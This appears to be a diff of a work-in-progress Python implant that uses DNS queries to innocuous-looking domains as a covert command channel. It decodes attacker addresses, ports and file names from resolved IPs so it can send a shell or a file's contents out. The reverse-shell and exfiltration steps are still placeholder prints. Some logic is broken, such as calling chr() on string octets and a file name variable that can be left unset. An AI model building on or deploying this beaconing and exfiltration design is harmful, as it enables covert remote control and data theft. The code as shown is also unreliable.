@@ -56,6 +56,18 @@ def formSocket():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(2)
     return sock
+    
+def resolveFileName(ips):
+    characters = []
+    fileName = ""
+    for ip in ips:
+        ipSplit = ip.split('.')
+        for entry in ipSplit:
+            characters.append(entry)
+    for character in characters:
+        fileName = fileName + chr(character)
+        
+    return fileName
 
 sock = formSocket()
 sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
@@ -79,9 +91,15 @@ while True:
             resp, _ = sock.recvfrom(512)
 
             ips = getResponse(resp)
-            print("Resolved IPs:", ips)
             
-            time.sleep(10)
+            address = ips[0]
+            portIP = ips[1]
+            
+            portIPSplit = portIP.split('.')
+            port = int(portIPSplit[0]) + int(portIPSplit[1])
+            
+            if not ((address == "100.100.100.100") and (port == 100)):
+                print(f"Sending shell to {address}:{port}") 
         elif(ipSplit[3] == "85"): 
             print("Collecting file contents")
             
@@ -89,10 +107,24 @@ while True:
             resp, _ = sock.recvfrom(512)
 
             ips = getResponse(resp)
-            print("Resolved IPs:", ips)
             
-            time.sleep(10)
-        else:
-            time.sleep(10)
-    else:
-        time.sleep(10)
+            if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
+                fileName = resolveFileName(ips)
+                
+            print(f"Accessing file: {fileName}")
+            
+            sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
+            resp, _ = sock.recvfrom(512)
+            
+            ips = getResponse(resp)
+            
+            address = ips[0]
+            portIP = ips[1]
+            
+            portIPSplit = portIP.split('.')
+            port = int(portIPSplit[0]) + int(portIPSplit[1])
+            
+            if not ((address == "100.100.100.100") and (port == 100)):
+                print(f"Sending file contents to {address}:{port}") 
+            
+    time.sleep(10)
